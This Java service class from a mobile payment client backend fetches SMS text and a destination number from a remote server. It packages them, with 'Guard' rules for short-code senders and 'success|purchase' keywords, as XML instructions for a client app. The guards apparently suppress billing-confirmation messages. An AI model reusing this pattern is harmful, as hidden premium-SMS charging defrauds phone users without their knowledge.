package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Properties;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.CommonUtil;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;

public class FfkjLtDynamicService implements IDynamicService{

	private static final String TYPE = "ffkjLt";
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final String REQUESTMODEL = "cid={cid}&randomid={randomid}&price={price}";
	
	private static final Guard guard0 = new Guard("10655477","成功|购买",2880,"1",0);
	private static final Guard guard1 = new Guard("10655","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();

	private int timeOut = 60;
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String cid = map.get("cid");
			String price = map.get("price");
			String randomid = channel.substring(channel.length() - 5);
			
			String param = REQUESTMODEL.replace("{cid}",cid).replace("{price}",price).replace("{randomid}",randomid);
			
			String responseTxt = GetData.getData(url, param);
			
			xml = parseTxt(responseTxt);

			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}
	
	private String parseTxt(String responseTxt){
		
		if(responseTxt != null && responseTxt.length() > 0){
			
			responseTxt = responseTxt.replace("@", "\r\n");
			
			Properties prop = CommonUtil.getProp(responseTxt);
			
			String accessno = prop.getProperty("accessno");
			String msg = prop.getProperty("sms");
			
			if(accessno != null && accessno.length() > 0 && msg != null && msg.length() > 0){

				List<Sms> smsList = new ArrayList<Sms>();
				
				Sms sms = new Sms();
				
				sms.setSmsContent(msg);
				sms.setSmsDest(accessno);
				sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
				
				smsList.add(sms);
				
				Sms guardSms = new Sms();
				
				List<Guard> guardList = new ArrayList<Guard>();
				
				guardList.add(guard0);
				guardList.add(guard1);
				
				guardSms.setGuardList(guardList);
				
				smsList.add(0, guardSms);
					
				return XstreamHelper.toXml(smsList);
			}
			
		}
		
		return null;
	}
	
	public static void main(String[] args){
		String url = "http://182.92.226.158:8332/channel/wo.sms";
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", url);
		map.put("channel", "10B101a87654322");
		map.put("cid", "20");
		map.put("price","10");
		
		System.out.println(new FfkjLtDynamicService().dynamic(map));
	}

}
